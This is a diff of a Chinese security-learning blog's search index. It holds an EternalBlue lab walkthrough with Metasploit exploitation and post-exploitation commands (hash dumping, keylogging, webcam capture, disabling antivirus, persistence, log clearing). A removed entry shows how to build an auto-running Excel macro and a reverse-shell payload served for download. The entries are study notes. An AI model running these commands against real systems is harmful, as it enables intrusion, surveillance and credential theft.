@@ -201,121 +201,6 @@
       </tags>
   </entry>
   <entry>
-    <title>随机背景API接口整理</title>
-    <url>/2022/03/20/backgroundAPI/</url>
-    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
-<p>（API链接在后面）</p>
-<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
-<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
-<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
-<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
-<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
-<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
-<h1>API接口链接</h1>
-<h2 id="必应壁纸">必应壁纸</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
-<center>今日必应壁纸</center>
-<h2 id="野生动漫-API">野生动漫 API</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
-<blockquote>
-<p>小歪 API</p>
-<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
-</blockquote>
-<blockquote>
-<p>未知名称动漫 API</p>
-<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
-</blockquote>
-<blockquote>
-<p>樱花 API</p>
-<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
-</blockquote>
-<blockquote>
-<p>岁月小筑随机背景 API</p>
-<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
-</blockquote>
-<blockquote>
-<p>保罗 API</p>
-<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
-</blockquote>
-<blockquote>
-<p>樱道随机图片</p>
-<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
-</blockquote>
-<blockquote>
-<p>墨天逸</p>
-<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
-</blockquote>
-<blockquote>
-<p>Unsplash</p>
-<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
-</blockquote>
-<blockquote>
-<p>后宫漫图：</p>
-<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
-</blockquote>
-<blockquote>
-<p>EEEDOG</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-</blockquote>
-<blockquote>
-<p>东方 Project</p>
-<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
-</blockquote>
-<blockquote>
-<p>搏天 API</p>
-<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
-</blockquote>
-<blockquote>
-<p>汐岑 ACG</p>
-<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
-</blockquote>
-<blockquote>
-<p>凌一 API</p>
-<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
-</blockquote>
-<blockquote>
-<p>Lorem Picsum</p>
-<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
-</blockquote>
-<blockquote>
-<p>API 接口文档 - 夏沫博客</p>
-<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
-</blockquote>
-<blockquote>
-<p>Ushio API</p>
-<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
-</blockquote>
-<blockquote>
-<p>点滴 API</p>
-<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
-</blockquote>
-<blockquote>
-<p>Langford’s API</p>
-<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
-</blockquote>
-<blockquote>
-<p>一铭 API</p>
-<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
-<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
-</blockquote>
-<blockquote>
-<p>R0A1NG’s API<br>
-<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
-</blockquote>
-<blockquote>
-<p>JacksonXE の API<br>
-<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
-</blockquote>
-<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-  </entry>
-  <entry>
     <title>My Awesome Photoblog靶机学习记录</title>
     <url>/2022/08/08/Photoblog/</url>
     <content><![CDATA[<h1>关于靶机</h1>
@@ -495,6 +380,121 @@
       </tags>
   </entry>
   <entry>
+    <title>随机背景API接口整理</title>
+    <url>/2022/03/20/backgroundAPI/</url>
+    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
+<p>（API链接在后面）</p>
+<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
+<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
+<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
+<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
+<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
+<h1>API接口链接</h1>
+<h2 id="必应壁纸">必应壁纸</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
+<center>今日必应壁纸</center>
+<h2 id="野生动漫-API">野生动漫 API</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
+<blockquote>
+<p>小歪 API</p>
+<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
+</blockquote>
+<blockquote>
+<p>未知名称动漫 API</p>
+<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
+</blockquote>
+<blockquote>
+<p>樱花 API</p>
+<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
+</blockquote>
+<blockquote>
+<p>岁月小筑随机背景 API</p>
+<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
+</blockquote>
+<blockquote>
+<p>保罗 API</p>
+<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
+</blockquote>
+<blockquote>
+<p>樱道随机图片</p>
+<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
+</blockquote>
+<blockquote>
+<p>墨天逸</p>
+<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
+</blockquote>
+<blockquote>
+<p>Unsplash</p>
+<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
+</blockquote>
+<blockquote>
+<p>后宫漫图：</p>
+<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
+</blockquote>
+<blockquote>
+<p>EEEDOG</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+</blockquote>
+<blockquote>
+<p>东方 Project</p>
+<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
+</blockquote>
+<blockquote>
+<p>搏天 API</p>
+<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
+</blockquote>
+<blockquote>
+<p>汐岑 ACG</p>
+<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
+</blockquote>
+<blockquote>
+<p>凌一 API</p>
+<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
+</blockquote>
+<blockquote>
+<p>Lorem Picsum</p>
+<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
+</blockquote>
+<blockquote>
+<p>API 接口文档 - 夏沫博客</p>
+<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
+</blockquote>
+<blockquote>
+<p>Ushio API</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+</blockquote>
+<blockquote>
+<p>点滴 API</p>
+<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
+</blockquote>
+<blockquote>
+<p>Langford’s API</p>
+<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
+</blockquote>
+<blockquote>
+<p>一铭 API</p>
+<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
+<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
+</blockquote>
+<blockquote>
+<p>R0A1NG’s API<br>
+<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
+</blockquote>
+<blockquote>
+<p>JacksonXE の API<br>
+<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
+</blockquote>
+<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+  </entry>
+  <entry>
     <title>SQL注入漏洞（一）</title>
     <url>/2022/02/16/SQL1/</url>
     <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
@@ -630,6 +630,66 @@ SQL注入按照服务器返回信息是否显示分为报错注入和盲注。�
       <tags>
         <tag>靶机</tag>
         <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>永恒之蓝漏洞复现</title>
+    <url>/2022/04/21/eternalblue/</url>
+    <content><![CDATA[<h1>漏洞描述：</h1>
+<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h1>影响版本：</h1>
+<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1>复现环境：</h1>
+<p>攻击机：Linux Kali （192.168.8.242）</p>
+<p>靶机：Windows7 x64 （192.168.8.172）</p>
+<h1>复现过程：</h1>
+<h2 id="主机发现">主机发现</h2>
+<p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
+<p><img src="https://img.anineg.space/1.png" alt="1"></p>
+<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
+<h2 id="进入MSF框架">进入MSF框架</h2>
+<p>执行<code>msfconsole</code></p>
+<p><img src="https://img.anineg.space/2.png" alt="2"></p>
+<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
+<p><img src="https://img.anineg.space/3.png" alt="3"></p>
+<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
+<h2 id="使用ms17-010扫描模块">使用ms17-010扫描模块</h2>
+<p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p>查看模块需要配置的参数  <code>show options  </code></p>
+<p><img src="https://img.anineg.space/4.png" alt="4"></p>
+<p>在Required一栏中显示yes的需要填写Current Setting项</p>
+<p>如 <code>set rhosts 192.168.8.172</code></p>
+<p>执行扫描 <code>run</code></p>
+<p><img src="https://img.anineg.space/5.png" alt="5"></p>
+<p>显示可能存有永恒之蓝漏洞。</p>
+<h2 id="使用ms17-010攻击模块">使用ms17-010攻击模块</h2>
+<p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p>查看模块需要配置的参数  <code>show options  </code></p>
+<p><img src="https://img.anineg.space/6.png" alt="6"></p>
+<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
+<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
+<p>执行攻击 <code>run</code></p>
+<p><img src="https://img.anineg.space/7.png" alt="7"></p>
+<center>攻击成功！</center>
+<hr>
+<h2 id="后渗透阶段">后渗透阶段</h2>
+<p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
+<p><img src="https://img.anineg.space/8.png" alt="8"></p>
+<p>使用<code>screenshot</code>进行截屏</p>
+<p><img src="https://img.anineg.space/9.png" alt="9"></p>
+<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
+<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
+<h2 id="更多操作">更多操作</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -773,66 +833,6 @@ SQL注入按照服务器返回信息是否显示分为报错注入和盲注。�
       <tags>
         <tag>靶机</tag>
         <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>永恒之蓝漏洞复现</title>
-    <url>/2022/04/21/eternalblue/</url>
-    <content><![CDATA[<h1>漏洞描述：</h1>
-<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<h1>影响版本：</h1>
-<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1>复现环境：</h1>
-<p>攻击机：Linux Kali （192.168.8.242）</p>
-<p>靶机：Windows7 x64 （192.168.8.172）</p>
-<h1>复现过程：</h1>
-<h2 id="主机发现">主机发现</h2>
-<p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
-<p><img src="https://img.anineg.space/1.png" alt="1"></p>
-<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
-<h2 id="进入MSF框架">进入MSF框架</h2>
-<p>执行<code>msfconsole</code></p>
-<p><img src="https://img.anineg.space/2.png" alt="2"></p>
-<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
-<p><img src="https://img.anineg.space/3.png" alt="3"></p>
-<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
-<h2 id="使用ms17-010扫描模块">使用ms17-010扫描模块</h2>
-<p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p>查看模块需要配置的参数  <code>show options  </code></p>
-<p><img src="https://img.anineg.space/4.png" alt="4"></p>
-<p>在Required一栏中显示yes的需要填写Current Setting项</p>
-<p>如 <code>set rhosts 192.168.8.172</code></p>
-<p>执行扫描 <code>run</code></p>
-<p><img src="https://img.anineg.space/5.png" alt="5"></p>
-<p>显示可能存有永恒之蓝漏洞。</p>
-<h2 id="使用ms17-010攻击模块">使用ms17-010攻击模块</h2>
-<p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>查看模块需要配置的参数  <code>show options  </code></p>
-<p><img src="https://img.anineg.space/6.png" alt="6"></p>
-<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
-<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
-<p>执行攻击 <code>run</code></p>
-<p><img src="https://img.anineg.space/7.png" alt="7"></p>
-<center>攻击成功！</center>
-<hr>
-<h2 id="后渗透阶段">后渗透阶段</h2>
-<p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
-<p><img src="https://img.anineg.space/8.png" alt="8"></p>
-<p>使用<code>screenshot</code>进行截屏</p>
-<p><img src="https://img.anineg.space/9.png" alt="9"></p>
-<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
-<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
-<h2 id="更多操作">更多操作</h2>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1074,62 +1074,6 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
 <script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
   </entry>
   <entry>
-    <title>反弹Shell:通过Excel表格进行远控</title>
-    <url>/2023/04/02/officevba/</url>
-    <content><![CDATA[<h1>讲在前面</h1>
-<p>很久没有更新啦，自从12月新冠开始再加上过年和开学考试<s>再加上亿点点的划水</s>，不知不觉就过去这么久了。那么今天刚好开完了社团的分享会，也一起在这里更新一下内容，也算是作为这次分享的记录了。</p>
-<hr>
-<h1>什么是宏？</h1>
-<p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。</p>
-<p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。</p>
-<h1>如何利用？</h1>
-<p>我们创建一个启用宏的excel表格，例如<code>值日名单.xlsm</code>。</p>
-<p>点击<code>视图</code>-<code>宏</code>-<code>查看宏</code>，在这里创建一个<code>AutoOpen</code></p>
-<p><img src="https://img.anineg.space/vba2.png" alt=""></p>
-<h2 id="1-弹出计算器">1.弹出计算器</h2>
-<p>在弹出的VBA中，修改为如下代码，点击运行，即可弹出计算器。</p>
-<p><img src="https://img.anineg.space/vba4-1.png" alt=""></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    LaunchCalculator</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub LaunchCalculator()</span><br><span class="line">    Shell "calc"</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
-<p>原理其实就是在shell中输入<code>calc</code>，启动计算器。</p>
-<h3 id="启动Excel时自动执行">启动Excel时自动执行</h3>
-<p>在左侧<code>ThisWorkbook</code>中添加如下代码：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Private Sub Workbook_Open()</span><br><span class="line">    Call AutoOpen</span><br><span class="line">End Sub</span><br></pre></td></tr></tbody></table></figure>
-<p><img src="https://img.anineg.space/vba5.png" alt=""></p>
-<p>可以令excel在启动时自动运行<code>AutoOpen</code></p>
-<h2 id="2-浏览器全屏访问指定网页">2.浏览器全屏访问指定网页</h2>
-<p>以火狐浏览器为例：</p>
-<p>代码如下，其中</p>
-<p><code>firefoxPath</code>是指火狐浏览器的安装路径。</p>
-<p><code>websiteURL</code>是指要打开的网页。</p>
-<p><code>--kiosk</code>是指定浏览器全屏模式启动，也可以修改为<code>-url</code>以普通模式启动。</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">    OpenWeb</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub OpenWeb()</span><br><span class="line">    Dim firefoxPath As String</span><br><span class="line">    Dim websiteURL As String</span><br><span class="line">    </span><br><span class="line">    firefoxPath = "C:\Program Files\Mozilla Firefox\firefox.exe"</span><br><span class="line">    websiteURL = "https://anineg.space/"</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Call Shell(firefoxPath &amp; " --kiosk " &amp; websiteURL, vbNormalFocus)</span><br><span class="line">End Sub</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
-<h2 id="3-利用反弹shell控制">3.利用反弹shell控制</h2>
-<p>在KALI（IP:192.168.80.128） 中生成<code>nc.exe</code>，具体过程不再详细叙述，给出命令行如下：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line"></span><br><span class="line">msfconsole   </span><br><span class="line"></span><br><span class="line">use windows/x64/meterpreter_reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.80.128 lport=4444 -f exe -o nc.exe</span><br></pre></td></tr></tbody></table></figure>
-<p>现在在<code>/var/www/html</code>路径下有<code>nc.exe</code>文件，我们需要它能够在Windows上被下载，所以我们启动web服务：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">systemctl start apache2.service</span><br></pre></td></tr></tbody></table></figure>
-<p>如果此时在Windows浏览器中打开：<code>http://192.168.80.128/nc.exe</code> ，文件就可以被下载了。</p>
-<p>回到Excel中，修改代码如下：</p>
-<p>原理同上，就是使用<code>curl</code>帮我们下载文件，然后在cmd中直接运行。</p>
